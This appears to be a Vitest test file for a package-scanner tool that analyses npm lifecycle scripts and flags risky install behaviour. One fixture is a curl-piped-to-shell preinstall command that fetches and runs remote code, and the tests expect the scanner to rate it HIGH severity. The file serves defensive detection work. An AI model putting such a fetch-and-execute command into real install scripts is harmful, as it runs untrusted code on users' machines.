import { describe, expect, it } from "vitest";
import { analysePackage } from "./analyse.js";
import { analyseLifecycleScripts, referencedFilesOf } from "./lifecycle.js";
import { DEFAULT_ANALYSIS_LIMITS } from "./limits.js";

const limits = DEFAULT_ANALYSIS_LIMITS;

describe("referencedFilesOf — recovering the file that actually runs", () => {
  it("recovers a node script", () => {
    expect(referencedFilesOf("node scripts/install.js", limits)).toEqual([
      "scripts/install.js",
    ]);
  });

  it("strips a leading ./", () => {
    expect(referencedFilesOf("node ./scripts/install.js", limits)).toEqual([
      "scripts/install.js",
    ]);
  });

  it("handles flags between the interpreter and the script", () => {
    expect(
      referencedFilesOf("node --no-warnings scripts/postinstall.cjs", limits),
    ).toEqual(["scripts/postinstall.cjs"]);
  });

  it("recovers a shell script", () => {
    expect(referencedFilesOf("sh scripts/build.sh", limits)).toEqual([
      "scripts/build.sh",
    ]);
  });

  it("recovers from every command in a chain", () => {
    expect(referencedFilesOf("node scripts/a.js && node scripts/b.js", limits)).toEqual([
      "scripts/a.js",
      "scripts/b.js",
    ]);
  });

  it("recovers a script invoked directly by path", () => {
    expect(referencedFilesOf("./bin/setup.sh --force", limits)).toEqual(["bin/setup.sh"]);
  });

  it("deduplicates repeated references", () => {
    expect(referencedFilesOf("node a.js && node a.js", limits)).toEqual(["a.js"]);
  });

  it("rejects absolute paths and parent traversal", () => {
    expect(referencedFilesOf("node /etc/evil.js", limits)).toEqual([]);
    expect(referencedFilesOf("node ../../outside.js", limits)).toEqual([]);
  });

  it("returns nothing when the command references no file it can see", () => {
    expect(referencedFilesOf("node -e \"require('x')\"", limits)).toEqual([]);
    expect(referencedFilesOf("tsc -p tsconfig.json", limits)).toEqual([]);
  });

  it("is bounded on a pathological command string", () => {
    const command = "node a.js && ".repeat(10_000);
    const found = referencedFilesOf(command, limits);
    expect(found.length).toBeLessThanOrEqual(16);
  });
});

describe("analyseLifecycleScripts — calibration", () => {
  it("records an install script at LOW severity with HIGH confidence", () => {
    const result = analyseLifecycleScripts(
      { scripts: { postinstall: "node scripts/install.js" } },
      limits,
    );
    const finding = result.findings.find(
      (candidate) => candidate.category === "INSTALL_SCRIPT",
    );
    expect(finding?.severity).toBe("LOW");
    expect(finding?.confidence).toBe("HIGH");
    expect(result.lifecycleScripts[0]?.runsOnInstall).toBe(true);
    expect(result.lifecycleScripts[0]?.referencedFiles).toEqual(["scripts/install.js"]);
  });

  it("does not mark a non-install script as running on install", () => {
    const result = analyseLifecycleScripts({ scripts: { build: "tsc -p ." } }, limits);
    expect(result.lifecycleScripts[0]?.runsOnInstall).toBe(false);
    expect(result.findings.filter((f) => f.category === "INSTALL_SCRIPT")).toHaveLength(
      0,
    );
  });

  it("does not raise severity for a plain node-gyp build", () => {
    const result = analyseLifecycleScripts(
      { scripts: { install: "node-gyp rebuild" } },
      limits,
    );
    expect(result.findings.every((finding) => finding.severity === "LOW")).toBe(true);
  });

  it("reports curl-piped-to-shell as a remote code fetch", () => {
    const result = analyseLifecycleScripts(
      { scripts: { preinstall: "curl -sL https://example.test/i.sh | sh" } },
      limits,
    );
    const finding = result.findings.find(
      (candidate) => candidate.category === "REMOTE_CODE_FETCH",
    );
    expect(finding?.severity).toBe("HIGH");
  });

  it("reports a plain download separately from fetch-and-execute", () => {
    const result = analyseLifecycleScripts(
      { scripts: { install: "curl -sL https://example.test/bin.tgz -o bin.tgz" } },
      limits,
    );
    expect(
      result.findings.some((finding) => finding.category === "DOWNLOAD_BEHAVIOUR"),
    ).toBe(true);
    expect(
      result.findings.some((finding) => finding.category === "REMOTE_CODE_FETCH"),
    ).toBe(false);
  });

  it("reports inline interpreter code in an install script", () => {
    const result = analyseLifecycleScripts(
      { scripts: { postinstall: 'node -e "console.log(1)"' } },
      limits,
    );
    const finding = result.findings.find(
      (candidate) => candidate.ruleId === "manifest/lifecycle/inline-code",
    );
    expect(finding?.severity).toBe("MEDIUM");
  });

  it("points at the manifest line when the manifest text is available", () => {
    const manifestText = [
      "{",
      '  "name": "demo",',
      '  "scripts": {',
      '    "postinstall": "node scripts/install.js"',
      "  }",
      "}",
      "",
    ].join("\n");
    const result = analyseLifecycleScripts(
      { scripts: { postinstall: "node scripts/install.js" }, manifestText },
      limits,
    );
    expect(result.findings[0]?.location.startLine).toBe(4);
  });
});

describe("analysePackage — lifecycle bridges into file analysis", () => {
  it("analyses the file a postinstall script references", () => {
    const result = analysePackage({
      scripts: { postinstall: "node scripts/install.js" },
      files: [
        {
          path: "scripts/install.js",
          content: `const { exec } = require("child_process");\nexec("echo hi");\n`,
        },
        { path: "index.js", content: `module.exports = 1;\n` },
      ],
    });

    expect(result.lifecycleScripts[0]?.referencedFiles).toEqual(["scripts/install.js"]);
    const processFindings = result.findings.filter(
      (finding) => finding.category === "PROCESS_EXECUTION",
    );
    expect(processFindings).toHaveLength(1);
    expect(processFindings[0]?.location.filePath).toBe("scripts/install.js");
  });

  it("analyses install-referenced files first so a budget cannot skip them", () => {
    const filler = Array.from({ length: 5 }, (_, index) => ({
      path: `lib/${String(index)}.js`,
      content: "module.exports = 1;\n",
    }));
    const result = analysePackage(
      {
        scripts: { postinstall: "node scripts/install.js" },
        files: [
          ...filler,
          { path: "scripts/install.js", content: "module.exports = 2;\n" },
        ],
      },
      { limits: { maxFilesAnalysed: 1 } },
    );

    const analysed = result.files.filter((file) => file.analysed);
    expect(analysed).toHaveLength(1);
    expect(analysed[0]?.path).toBe("scripts/install.js");
    expect(
      result.limitNotices.some((notice) => notice.limit === "maxFilesAnalysed"),
    ).toBe(true);
  });
});
